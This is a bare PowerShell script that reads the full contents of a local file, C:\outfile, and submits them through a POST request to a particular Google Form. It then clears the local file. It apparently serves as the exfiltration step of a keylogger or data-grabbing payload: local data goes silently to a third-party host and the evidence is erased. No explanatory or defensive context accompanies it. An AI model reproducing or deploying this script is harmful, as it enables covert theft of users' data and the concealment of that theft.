$dump = Get-Content -Path C:\outfile -Raw
$R = Invoke-WebRequest https://docs.google.com/forms/d/e/1FAIpQLSegeBbud-xkTMry9NILjrx-oqF0-BArDA7L3Mgu9-Z0UUwBEQ/viewform
$Form = $R.Forms[0]
$Form.fields[entry.474201868] = $dump
$Uri = "https://docs.google.com/forms/d/e/1FAIpQLSegeBbud-xkTMry9NILjrx-oqF0-BArDA7L3Mgu9-Z0UUwBEQ/viewform" + $Form.Action
$R = Invoke-WebRequest -Uri $Uri -Method POST -Body $Form.Fields
Start-Sleep -s 2
Clear-Content "C:\outfile"
